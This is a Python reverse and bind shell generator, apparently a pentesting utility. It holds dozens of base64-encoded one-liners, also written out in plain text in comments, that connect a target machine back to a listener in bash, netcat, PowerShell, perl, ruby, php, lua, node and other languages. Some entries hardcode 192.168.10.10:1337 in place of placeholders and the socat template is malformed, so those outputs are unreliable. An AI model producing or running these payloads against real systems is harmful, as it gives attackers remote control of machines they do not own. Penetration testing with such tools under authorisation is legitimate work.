#!/usr/bin/env python3
# Author: Charlie BROMBERG (Shutdown - @_nwodtuhs)

'''
 Heavily inspired by : https://github.com/sameera-madushan/Print-My-Shell
Reverse shells found on :
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
- https://ashr.net/bind/and/reverse/shell/cheatsheet/windows/and/linux.aspx
'''

import argparse
import base64
import sys
import re
import argparse
from simple_term_menu import TerminalMenu
from colorama import Fore
from colorama import Style

def get_options():
    parser = argparse.ArgumentParser(description='Generate a bind/reverse shell')
    # Can't choose bind shell and reverse shell
    shelltype = parser.add_mutually_exclusive_group()
    shelltype.add_argument('-b', '--bind-shell', dest='SHELLTYPE', action='store_const', const='bindshells', help='Generate a bind shell (you connect to the target)')
    shelltype.add_argument('-r', '--reverse-shell', dest='SHELLTYPE', action='store_const', const='revshells', help='Generate a reverse shell (the target connects to you) (Default)')
    # Sets reverse shell as default value for SHELLTYPE (https://stackoverflow.com/questions/38507675/python-argparse-mutually-exclusive-group-with-default-if-no-argument-is-given)
    parser.set_defaults(SHELLTYPE = 'revshells')
    # Creates group of options for bindshell
    bindshell = parser.add_argument_group('Bind shell options')
    # typeoptions and portoption are two options either bindshell or revshell will need (https://stackoverflow.com/questions/23775378/allowing-same-option-in-different-argparser-group)
    typeoption = bindshell.add_argument('-t', '--type', dest='TYPE', type=str.lower, help='Type of the shell to generate (Bash, Powershell, Java...)')
    portoption = bindshell.add_argument('-p', '--port', dest='LPORT', type=int, default=1337, help='Listener Port (required for reverse shells) (Default: 1337)')
    revshell = parser.add_argument_group('Reverse shell options')
    revshell._group_actions.append(typeoption)
    revshell.add_argument('-i', '--ip', dest='LHOST', type=str, help='Listener IP address (required for reverse shells)')
    revshell._group_actions.append(portoption)
    options = parser.parse_args()
    if options.SHELLTYPE == 'revshells' and not options.LHOST:
        parser.error('Listener IP address not supplied')
    if not options.LPORT:
        parser.error('Listener IP port not supplied')
    else:
        options.LPORT = str(options.LPORT)
    if not options.TYPE:
        if options.SHELLTYPE == 'revshells':
            shells_dict = revshells
        elif options.SHELLTYPE == 'bindshells':
            shells_dict = bindshells
        menu = TerminalMenu(list(shells_dict.keys()), title='What type of shell do you want?')
        selection = menu.show()
        options.TYPE = list(shells_dict.keys())[selection]
    return options

# Helper function for populate populate_shells to add values to the dictionnary
def add_shell(dictionnary, key, value):
    if not key in dictionnary.keys():
        values = [value]
        dictionnary.update({key:values})
    else:
        values = []
        for element in dictionnary[key]:
            values.append(element)
        values.append(value)
        dictionnary.update({key:values})

# Decode from base64 and format with IP and PORT
def gen_shell():
    shell = base64.b64decode(encoded_shell).decode('utf-8')
    if options.SHELLTYPE == 'revshells':
        return shell.replace('{0}', options.LHOST).replace('{1}', options.LPORT).strip()
    elif options.SHELLTYPE == 'bindshells':
        return shell.replace('{0}', options.LPORT).strip()

# Search for notes in shells in the format <note>Some kinf of note</note>
def search_notes():
    notes = ''
    if '<note>' in shell:
        for match in re.findall('<note>(.+?)</note>', shell):
            notes += Fore.BLUE + Style.BRIGHT + match + Style.RESET_ALL + ' '
    return notes

# Add shells to the main dictionnaries: revshells and bindshells
def populate_shells():
    '''
    Shells dictionnary population
    Shells must be encoded in base64 in order to manage more easily special characters
    You can add notes to each shell in the format <note>Whatever you want</note>. These notes will be printed in blue.
    Base64 encoded shells with notes start with: PG5vdGU
    '''
    # bash -i >& /dev/tcp/{0}/{1} 0>&1
    add_shell(revshells, 'bash', 'YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=')
    # 0<&196;exec 196<>/dev/tcp/{0}/{1}; sh <&196 >&196 2>&196
    add_shell(revshells, 'bash', 'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97MH0vezF9OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY=')
    #exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done
    add_shell(revshells, 'bash', 'ZXhlYyA1PD4vZGV2L3RjcC97MH0vezF9O2NhdCA8JjUgfCB3aGlsZSByZWFkIGxpbmU7IGRvICRsaW5lIDI+JjUgPiY1OyBkb25l')
    #exec /bin/sh 0</dev/tcp/{0}/{1} 1>&0 2>&0  [+++]
    add_shell(revshells, 'bash', 'ZXhlYyAvYmluL3NoIDA8L2Rldi90Y3AvezB9L3sxfSAxPiYwIDI+JjA=')
    #echo 'set s [socket {0} {1}];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
    add_shell(revshells, 'tcl', 'ZWNobyAnc2V0IHMgW3NvY2tldCB7MH0gezF9XTt3aGlsZSA0MiB7IHB1dHMgLW5vbmV3bGluZSAkcyAic2hlbGw+IjtmbHVzaCAkcztnZXRzICRzIGM7c2V0IGUgImV4ZWMgJGMiO2lmIHshW2NhdGNoIHtzZXQgciBbZXZhbCAkZV19IGVycl19IHsgcHV0cyAkcyAkciB9OyBmbHVzaCAkczsgfTsgY2xvc2UgJHM7JyB8IHRjbHNo')
    # nc -e /bin/sh {0} {1}
    add_shell(revshells, 'netcat', 'bmMgLWUgL2Jpbi9zaCB7MH0gezF9')
    # nc -e /bin/bash {0} {1}
    add_shell(revshells, 'netcat', 'bmMgLWUgL2Jpbi9iYXNoIHswfSB7MX0=')
    # nc -c bash {0} {1}
    add_shell(revshells, 'netcat', 'bmMgLWMgYmFzaCB7MH0gezF9')
    # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f
    add_shell(revshells, 'netcat', 'PG5vdGU+T3BlbkJTRDwvbm90ZT5ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjEwLjEwIDEzMzcgPi90bXAvZgo=')
    # ncat {0} {1} -e /bin/bash
    add_shell(revshells, 'netcat', 'bmNhdCB7MH0gezF9IC1lIC9iaW4vYmFzaA==')
    # ncat --udp {0} {1} -e /bin/bash
    add_shell(revshells, 'netcat', 'bmNhdCAtLXVkcCB7MH0gezF9IC1lIC9iaW4vYmFzaA==')
    # rm -f /tmp/p; mknod /tmp/p p && telnet {0} {1} 0/tmp/p
    add_shell(revshells, 'telnet', 'cm0gLWYgL3RtcC9wOyBta25vZCAvdG1wL3AgcCAmJiB0ZWxuZXQgezB9IHsxfSAwL3RtcC9w')
    #rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet {0} {1} > f
    add_shell(revshells, 'telnet', 'cm0gZjtta2ZpZm8gZjtjYXQgZnwvYmluL3NoIC1pIDI+JjF8dGVsbmV0IHswfSB7MX0gPiBm')
    # telnet {0} {1} | /bin/bash | telnet {0} {1}
    add_shell(revshells, 'telnet', 'dGVsbmV0IHswfSB7MX0gfCAvYmluL2Jhc2ggfCB0ZWxuZXQgezB9IHsxfQ==')
    # python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    add_shell(revshells, 'python', 'cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=')
    # powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{0}",{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
    add_shell(revshells, 'powershell', 'cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCJ7MH0iLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syICA9ICRzZW5kYmFjayArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkK')
    # powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    add_shell(revshells, 'powershell', 'cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCd7MH0nLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKSIK')
    # socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{0}:{1}
    add_shell(revshells, 'socat', 'c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDp7MH06ezF9')
    # socat tcp-connect:{}:{} system:/bin/sh
    add_shell(revshells, 'socat', 'c29jYXQgdGNwLWNvbm5lY3Q6e306e30gc3lzdGVtOi9iaW4vc2g=')
    # perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    add_shell(revshells, 'perl', 'cGVybCAtZSAndXNlIFNvY2tldDskaT0iezB9IjskcD17MX07c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jwo=')
    # perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{0}:{1}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
    add_shell(revshells, 'perl', 'cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7MH06ezF9Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3N5c3RlbSRfIHdoaWxlPD47Jw==')
    # perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{0}:{1}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
    add_shell(revshells, 'perl', 'PG5vdGU+V2luZG93czwvbm90ZT5wZXJsIC1NSU8gLWUgJyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxOTIuMTY4LjEwLjEwOjEzMzciKTtTVERJTi0+ZmRvcGVuKCRjLHIpOyR+LT5mZG9wZW4oJGMsdyk7c3lzdGVtJF8gd2hpbGU8PjsnCg==')
    # ruby -rsocket -e'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
    add_shell(revshells, 'ruby', 'cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7MH0iLHsxfSkudG9faTtleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgPCYlZCA+JiVkIDI+JiVkIixmLGYsZikn')
    # ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{0}","{1}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
    add_shell(revshells, 'ruby', 'cnVieSAtcnNvY2tldCAtZSAnZXhpdCBpZiBmb3JrO2M9VENQU29ja2V0Lm5ldygiezB9IiwiezF9Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7fGlvfGMucHJpbnQgaW8ucmVhZH1lbmQnCg==')
    # ruby -rsocket -e 'c=TCPSocket.new("{0}","{1}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
    add_shell(revshells, 'ruby', 'PG5vdGU+V2luZG93czwvbm90ZT5ydWJ5IC1yc29ja2V0IC1lICdjPVRDUFNvY2tldC5uZXcoIjE5Mi4xNjguMTAuMTAiLCIxMzM3Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7fGlvfGMucHJpbnQgaW8ucmVhZH1lbmQnCg==')
    # echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{0}:{1}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
    add_shell(revshells, 'golang', 'ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXtjLF86PW5ldC5EaWFsKCJ0Y3AiLCJ7MH06ezF9Iik7Y21kOj1leGVjLkNvbW1hbmQoIi9iaW4vc2giKTtjbWQuU3RkaW49YztjbWQuU3Rkb3V0PWM7Y21kLlN0ZGVycj1jO2NtZC5SdW4oKX0nID4gL3RtcC90LmdvICYmIGdvIHJ1biAvdG1wL3QuZ28gJiYgcm0gL3RtcC90LmdvCg==')
    # awk 'BEGIN {s = "/inet/tcp/0/{0}/{1}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
    add_shell(revshells, 'awk', 'YXdrICdCRUdJTiB7cyA9ICIvaW5ldC90Y3AvMC97MH0vezF9Ijsgd2hpbGUoNDIpIHsgZG97IHByaW50ZiAic2hlbGw+IiB8JiBzOyBzIHwmIGdldGxpbmUgYzsgaWYoYyl7IHdoaWxlICgoYyB8JiBnZXRsaW5lKSA+IDApIHByaW50ICQwIHwmIHM7IGNsb3NlKGMpOyB9IH0gd2hpbGUoYyAhPSAiZXhpdCIpIGNsb3NlKHMpOyB9fScgL2Rldi9udWxsCg==')
    # lua -e "require('socket');require('os');t=socket.tcp();t:connect('{0}','{1}');os.execute('/bin/sh -i <&3 >&3 2>&3');"
    add_shell(revshells, 'lua', 'PG5vdGU+TGludXg8L25vdGU+bHVhIC1lICJyZXF1aXJlKCdzb2NrZXQnKTtyZXF1aXJlKCdvcycpO3Q9c29ja2V0LnRjcCgpO3Q6Y29ubmVjdCgnMTkyLjE2OC4xMC4xMCcsJzEzMzcnKTtvcy5leGVjdXRlKCcvYmluL3NoIC1pIDwmMyA+JjMgMj4mMycpOyIK')
    # lua5.1 -e 'local host, port = "{0}", {1} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
    add_shell(revshells, 'lua', 'bHVhNS4xIC1lICdsb2NhbCBob3N0LCBwb3J0ID0gInswfSIsIHsxfSBsb2NhbCBzb2NrZXQgPSByZXF1aXJlKCJzb2NrZXQiKSBsb2NhbCB0Y3AgPSBzb2NrZXQudGNwKCkgbG9jYWwgaW8gPSByZXF1aXJlKCJpbyIpIHRjcDpjb25uZWN0KGhvc3QsIHBvcnQpOyB3aGlsZSB0cnVlIGRvIGxvY2FsIGNtZCwgc3RhdHVzLCBwYXJ0aWFsID0gdGNwOnJlY2VpdmUoKSBsb2NhbCBmID0gaW8ucG9wZW4oY21kLCAiciIpIGxvY2FsIHMgPSBmOnJlYWQoIiphIikgZjpjbG9zZSgpIHRjcDpzZW5kKHMpIGlmIHN0YXR1cyA9PSAiY2xvc2VkIiB0aGVuIGJyZWFrIGVuZCBlbmQgdGNwOmNsb3NlKCkn')
    # r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();
    add_shell(revshells, 'java', 'ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpO3AgPSByLmV4ZWMoWyIvYmluL3NoIiwiLWMiLCJleGVjIDU8Pi9kZXYvdGNwL3swfS97MX07Y2F0IDwmNSB8IHdoaWxlIHJlYWQgbGluZTsgZG8gXCRsaW5lIDI+JjUgPiY1OyBkb25lIl0gYXMgU3RyaW5nW10pO3Aud2FpdEZvcigpOw==')
    # (function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({1},"{0}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
    add_shell(revshells, 'nodejs', 'KGZ1bmN0aW9uKCl7dmFyIG5ldD1yZXF1aXJlKCJuZXQiKSxjcD1yZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksc2g9Y3Auc3Bhd24oIi9iaW4vc2giLFtdKTt2YXIgY2xpZW50PW5ldyBuZXQuU29ja2V0KCk7Y2xpZW50LmNvbm5lY3QoezF9LCJ7MH0iLGZ1bmN0aW9uKCl7Y2xpZW50LnBpcGUoc2guc3RkaW4pO3NoLnN0ZG91dC5waXBlKGNsaWVudCk7c2guc3RkZXJyLnBpcGUoY2xpZW50KTt9KTtyZXR1cm4gL2EvO30pKCk7Cg==')
    #php -r '$sock=fsockopen({0},{1});exec('/bin/sh -i <&3 >&3 2>&3');'
    add_shell(revshells, 'php', 'cGhwIC1yICckc29jaz1mc29ja29wZW4oezB9LHsxfSk7ZXhlYygnL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMnKTsn')
    #php -r '$sock=fsockopen({0},{1});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
    add_shell(revshells, 'php', 'cGhwIC1yICckc29jaz1mc29ja29wZW4oezB9LHsxfSk7JHByb2M9cHJvY19vcGVuKCIvYmluL3NoIC1pIiwgYXJyYXkoMD0+JHNvY2ssIDE9PiRzb2NrLCAyPT4kc29jayksJHBpcGVzKTsn')
    #php -r '$s=fsockopen("{0}",{1});popen("/bin/sh -i <&3 >&3 2>&3", "r");'
    add_shell(revshells, 'php', 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtwb3BlbigiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiLCAiciIpOyc=')
    #php -r '$s=fsockopen({0},{1});system("/bin/sh -i <&3 >&3 2>&3");'
    add_shell(revshells, 'php', 'cGhwIC1yICckcz1mc29ja29wZW4oezB9LHsxfSk7c3lzdGVtKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=')
    #php -r '$s=fsockopen("{0}",{1});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
    add_shell(revshells, 'php', 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtzaGVsbF9leGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=')
    #php -r '$s=fsockopen("{0}",{1});`/bin/sh -i <&3 >&3 2>&3`;'
    add_shell(revshells, 'php', 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtgL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjNgOyc=')
    # Bind shells dictionnary population
    add_shell(bindshells, 'netcat', 'bmMgLWx2cCB7MH0gLWUgL2Jpbi9zaA==')

if __name__ == '__main__':
    print()
    revshells = {}
    bindshells = {}
    populate_shells()
    options = get_options()
    shells_dict = globals()[options.SHELLTYPE]
    for encoded_shell in shells_dict[options.TYPE]:
        shell = gen_shell()
        notes = search_notes()
        notes_length = len(notes) - shell.count('<note>')
        shell_index = shells_dict[options.TYPE].index(encoded_shell) + 1
        print(Fore.BLUE + Style.BRIGHT + '[' + str(shell_index) + ']' + Style.RESET_ALL + ' ' + notes + shell[notes_length:] + '\n')
